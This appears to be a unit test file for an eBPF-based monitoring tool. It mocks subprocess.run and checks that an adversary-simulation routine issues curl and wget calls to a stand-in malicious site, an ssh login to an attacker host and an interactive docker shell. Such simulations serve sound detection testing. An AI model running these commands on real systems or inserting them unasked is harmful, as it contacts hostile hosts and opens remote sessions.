# test_simulation.py
from unittest.mock import call
from unittest.mock import patch, MagicMock
from ebpf_monitor.simulation import run_adversary_actions
import subprocess


# Test Adversary Simulation Execution
@patch("subprocess.run")
def test_adversary_simulation(mock_run):
    # Simulate successful execution of commands
    mock_run.return_value = MagicMock(returncode=0)

    run_adversary_actions()

    # Ensure all adversarial commands were executed
    expected_calls = [
        call("curl http://malicious-site.com", shell=True, check=True),
        call("wget http://malicious-site.com/file", shell=True, check=True),
        call("ssh attacker@remote-ip", shell=True, check=True),
        call("docker run --rm -it alpine sh", shell=True, check=True),
    ]
    mock_run.assert_has_calls(expected_calls, any_order=True)


# Test Command Failure Handling
@patch("subprocess.run", side_effect=subprocess.CalledProcessError(1, "test-command"))
def test_adversary_simulation_failure(mock_run):
    run_adversary_actions()
    mock_run.assert_called()


# Test Logging of Executed Commands
@patch("subprocess.run")
@patch("logging.info")
def test_logging(mock_log, mock_run):
    mock_run.return_value = MagicMock(returncode=0)
    run_adversary_actions()
    mock_log.assert_any_call("Starting adversarial action simulation...")
    mock_log.assert_any_call("Executed: curl http://malicious-site.com")
    mock_log.assert_any_call("Simulation complete.")
